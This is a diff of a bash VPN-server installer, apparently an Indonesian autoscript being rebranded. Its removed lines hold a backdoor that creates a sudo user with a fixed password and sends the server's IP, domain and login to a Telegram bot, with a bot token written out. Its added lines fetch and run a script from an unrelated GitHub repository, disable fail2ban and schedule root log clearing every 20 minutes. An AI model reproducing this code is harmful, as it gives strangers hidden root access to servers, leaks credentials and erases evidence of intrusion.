@@ -17,10 +17,11 @@ GRAY="\e[1;30m"
 NC='\e[0m'
 red='\e[1;31m'
 green='\e[0;32m'
+
 # ===================
 clear
   # // Exporint IP AddressInformation
-export IP=$( curl -sS ipinfo.io/ip )
+export IP=$( curl -sS icanhazip.com )
 
 # // Clear Data
 clear
@@ -29,38 +30,15 @@ clear;clear;clear
 
   # // Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "  Welcome To KANGSANTRI Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
-echo -e "     This Will Quick Setup VPN Server On Your Server"
-echo -e "         Auther : ${green} KANGSANTRI ${NC}${YELLOW}(${NC} ${green}KANGSANTRI ${NC}${YELLOW})${NC}"
-echo -e "       © Recode By KANGSANTRI ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
+echo -e "  Welcome To Yass vpn Tunneling ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
+echo -e " This Will Quick Setup VPN Server On Your Server"
+echo -e "  Auther : ${green}Yass vpn® ${NC}${YELLOW}(${NC} ${green} Yass vpn Tunneling ${NC}${YELLOW})${NC}"
+echo -e " © Recode By My Self Kangsantri Tunneling${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
-sleep 5
+sleep 2
 ###### IZIN SC 
-ipsaya=$(wget -qO- ipinfo.io/ip)
-data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
-date_list=$(date +"%Y-%m-%d" -d "$data_server")
-data_ip="https://raw.githubusercontent.com/Kangsantri123/vip/main/izin"
-checking_sc() {
-  useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
-  if [[ $date_list < $useexp ]]; then
-    echo -ne
-  else
-    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
-    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-    echo -e ""
-    echo -e "            ${RED}MAAF AKUN VPS ANDA SUKSES DI BANNED ${NC}"
-    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
-    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
-    echo -e "             \033[0;33mContact Admin :${NC}"
-    echo -e "      \033[0;36mTelegram${NC} t.me/@alwance"
-    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6285236846667"
-    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-    exit
-  fi
-}
-checking_sc
+
 # // Checking Os Architecture
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
     echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
@@ -303,8 +281,8 @@ clear
     echo -e "   .----------------------------------."
 echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
 echo -e "   '----------------------------------'"
-echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
-echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
+echo -e "     \e[1;32m1)\e[0m Domain Sendiri"
+echo -e "     \e[1;32m2)\e[0m Gunakan Domain Random Khusus Digital ocean ISP LAIN ✖️ "
 echo -e "   ------------------------------------"
 read -p "   Please select numbers 1-2 or Any Button(Random) : " host
 echo ""
@@ -328,45 +306,6 @@ clear
 
 clear
 #GANTI PASSWORD DEFAULT
-function password_default() {
-    domain=$(cat /root/domain)
-    MYIP=$(curl -sS ipv4.icanhazip.com)
-    userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
-
-    CHATID="5216099617"
-    KEY="6359278345:AAEHaXzhZf0KFRBBJeqlcRGYoJFeV1Cbbls"
-    TIME="10"
-    URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi VPN Script Stable V3.0
-    ============================
-    <code>Tanggal    :</code> <code>$tanggal</code>
-    <code>Hostname   :</code> <code>${HOSTNAME}</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>OS Vps     :</code> <code>$OS_Name</code>
-    <code>Kernel     :</code> <code>$Kernel</code>
-    <code>Arch       :</code> <code>$Arch</code>
-    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
-    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
-    ============================
-    <code>Domain     :</code> <code>$domain</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>User Login :</code> <code>$Username</code>
-    <code>Pass Login :</code> <code>$Password</code>
-    <code>User Script:</code> <code>$username</code>
-    <code>Exp Script :</code> <code>$exp</code>
-    ============================
-    (C) Copyright 2023 By KANGSANTRI 
-    ============================
-"
-
-   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-}
 
 clear
 # Pasang SSL
@@ -571,11 +510,8 @@ print_success "Password SSH"
 function udp_mini(){
 clear
 print_install "Memasang Service Limit Quota"
-wget -q -O /usr/local/sbin/quota "${REPO}limit/quota"
-chmod +x /usr/local/sbin/quota
-chmod + x /usr/local/sbin/quota
-cd /usr/local/sbin/
-sed -i 's/\r//' quota
+wget raw.githubusercontent.com/jeta124/vip/main/limit/limit.sh && chmod +x limit.sh && ./limit.sh
+
 cd
 wget -q -O /usr/bin/limit-ip "${REPO}limit/limit-ip"
 chmod +x /usr/bin/*
@@ -637,58 +573,6 @@ systemctl enable trip
 #SERVICE LIMIT QUOTA
 
 #SERVICE VMESS
-cat >/etc/systemd/system/qmv.service << EOF
-[Unit]
-Description=My
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota vmess
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart qmv
-systemctl enable qmv
-
-#SERVICE VLESS
-cat >/etc/systemd/system/qmvl.service << EOF
-[Unit]
-Description=My 
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota vless
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart qmvl
-systemctl enable qmvl
-
-#SERVICE TROJAN
-cat >/etc/systemd/system/qmtr.service << EOF
-[Unit]
-Description=My 
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota trojan
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart qmtr
-systemctl enable qmtr
 # // Installing UDP Mini
 mkdir -p /usr/local/kyt/
 wget -q -O /usr/local/kyt/udp-mini "${REPO}limit/udp-mini"
@@ -844,10 +728,10 @@ print_success "Swap 1 G"
 function ins_Fail2ban(){
 clear
 print_install "Menginstall Fail2ban"
-apt -y install fail2ban > /dev/null 2>&1
+#apt -y install fail2ban > /dev/null 2>&1
 #sudo systemctl enable --now fail2ban
-/etc/init.d/fail2ban restart
-/etc/init.d/fail2ban status
+#/etc/init.d/fail2ban restart
+#/etc/init.d/fail2ban status
 
 # Instal DDOS Flate
 if [ -d '/usr/local/ddos' ]; then
@@ -972,6 +856,11 @@ cat >/etc/cron.d/xp_all <<-END
 		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 		2 0 * * * root /usr/local/sbin/xp
 	END
+	cat >/etc/cron.d/logclean <<-END
+		SHELL=/bin/sh
+		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+		*/20 * * * * root /usr/local/sbin/clearlog
+		END
     chmod 644 /root/.profile
 	
     cat >/etc/cron.d/daily_reboot <<-END
@@ -1069,6 +958,7 @@ clear
     menu
     profile
     enable_services
+    restart_system
 }
 instal
 echo ""
@@ -1081,47 +971,6 @@ rm -rf /root/README.md
 rm -rf /root/domain
 #sudo hostnamectl set-hostname $user
 secs_to_human "$(($(date +%s) - ${start}))"
-echo ""
-echo " "
-echo "=====================-[ KANGSANTRI ]-===================="
-echo ""
-echo "------------------------------------------------------------"
-echo ""
-echo ""
-echo "   >>> Service & Port"  | tee -a log-install.txt
-echo "   - SlowDNS SSH              : ALL Port SSH"  | tee -a log-install.txt
-echo "   - OpenSSH                  : 22"  | tee -a log-install.txt
-echo "   - SSH Websocket            : 80 [ON]" | tee -a log-install.txt
-echo "   - SSH SSL Websocket        : 443" | tee -a log-install.txt
-echo "   - OpenVPN Websocket SSL    : 1194" | tee -a log-install.txt
-echo "   - OpenVPN SSL              : 1194" | tee -a log-install.txt
-echo "   - OpenVPN TCP              : 1194" | tee -a log-install.txt
-echo "   - OpenVPN UDP              : 2200" | tee -a log-install.txt
-echo "   - Stunnel4                 : 222, 777" | tee -a log-install.txt
-echo "   - Dropbear                 : 109, 143" | tee -a log-install.txt
-echo "   - Badvpn                   : 7100-7900" | tee -a log-install.txt
-echo "   - Nginx                    : 81" | tee -a log-install.txt
-echo "   - Vmess WS TLS             : 443" | tee -a log-install.txt
-echo "   - Vless WS TLS             : 443" | tee -a log-install.txt
-echo "   - Trojan WS TLS            : 443" | tee -a log-install.txt
-echo "   - Shadowsocks WS TLS       : 443" | tee -a log-install.txt
-echo "   - Vmess WS none TLS        : 80" | tee -a log-install.txt
-echo "   - Vless WS none TLS        : 80" | tee -a log-install.txt
-echo "   - Trojan WS none TLS       : 80" | tee -a log-install.txt
-echo "   - Shadowsocks WS none TLS  : 80" | tee -a log-install.txt
-echo "   - Vmess gRPC               : 443" | tee -a log-install.txt
-echo "   - Vless gRPC               : 443" | tee -a log-install.txt
-echo "   - Trojan gRPC              : 443" | tee -a log-install.txt
-echo "   - Shadowsocks gRPC         : 443" | tee -a log-install.txt
-echo ""
-echo ""
-echo "------------------------------------------------------------"
-echo ""
-echo "=====================-[ KANGSANTRI ]-===================="
-echo -e ""
-echo ""
-echo "" | tee -a log-install.txt
-echo -e ""
 sudo hostnamectl set-hostname $username
 echo -e "${green} Script Successfull Installed"
 echo ""
